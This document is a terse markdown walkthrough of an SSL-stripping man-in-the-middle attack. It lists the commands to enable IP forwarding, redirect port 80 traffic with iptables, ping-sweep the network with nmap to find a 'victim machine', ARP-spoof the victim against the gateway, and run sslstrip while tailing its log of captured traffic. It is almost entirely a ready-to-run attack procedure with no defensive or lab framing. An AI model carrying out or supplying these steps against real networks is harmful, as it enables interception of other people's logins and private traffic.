## ssl striping https to http (mitm)  
### this attack requires you to be on the same network.  
*tools needed*  
1. sslstrip  
2. arpspoof  
3. nmap  

### steps
1. `echo 1 > /proc/sys/net/ipv4/ip_forward`  its either 0 or 1.  we need it to be 1.  
2. `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`  
3. verify -- `iptables -t nat -L PREROUTING`  

*before*
```
Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination 
```
**after**
```
Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination         
REDIRECT   tcp  --  anywhere             anywhere             tcp dpt:http redir ports 8080
```
#### find victim machine host  
4. `nmap -n -sn 10.0.0.0/8 -vv`  scan local network  ping sweep  
5. `nmap -sP 192.168.2.1/24` or  `nmap $1 -n -sP | grep report | awk '{print $5}'` or `arp -a -n` finds all live hosts on network  
6. `arpspoof  -i wlan0 -t 10.0.0.1 -r 10.0.0.3<victim machine>`  
open ports if necessary  
8. check - `iptables -L INPUT`  
should look like this  
```
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http-alt
```
7. `iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT`  
8. `sslstrip -l 8080`  listening on port 8080  
*new terminal*  
9. `tail -f sslstrip.log`  

